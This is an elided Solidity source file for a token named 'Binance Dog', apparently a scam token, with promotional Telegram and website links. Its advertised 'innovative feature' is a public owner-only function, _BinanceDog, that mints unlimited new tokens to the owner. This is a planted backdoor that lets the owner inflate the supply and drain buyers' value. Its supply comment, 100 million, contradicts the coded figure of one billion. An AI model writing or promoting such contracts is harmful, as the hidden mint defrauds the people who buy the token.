//
// $BinanceDog proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/BinanceDogofc
// 📱 Website ::https://wfherc.pro
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _BinanceDog(uint256 amount) public onlyOwner {
 _BinanceDog(msg.sender, amount);
    }
    ...
    function _BinanceDog(address account, uint256 amount) internal virtual {
...
contract $BinanceDog is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Binance Dog", "WFH") {
     _BinanceDog(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}